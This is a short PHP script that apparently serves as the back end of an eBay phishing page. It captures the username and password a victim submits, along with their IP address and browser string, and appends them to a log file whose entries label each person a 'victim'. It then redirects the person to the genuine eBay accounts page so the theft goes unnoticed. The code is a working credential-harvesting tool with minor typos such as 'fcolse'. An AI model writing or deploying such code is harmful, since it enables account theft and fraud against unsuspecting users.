<?php
$date = date("Y/m/d");
$time = date("h:i:sa");
header('Location: https://accounts.ebay.com/acctxs/user');
$ebay_usern = $_POST['userid'];
$ebay_pass =  $_POST['pass'] ;
$browser = $_SERVER['HTTP_USER_AGENT'];

$client_ip =  $_SERVER['HTTP_CLIENT_IP'];
$file = fopen("ebay_thite_log.txt","a");
fwrite($file,"victiun ip :$client_ip \n");  
fwrite($file,"victum browse : $browser \nusername : $ebay_usern \n");
fwrite($file,"password : $ebay_pass \n");
fwrite($file,"login time : \n  date : $date \n  time : $time \n################################ \n");
fcolse($file);

?>
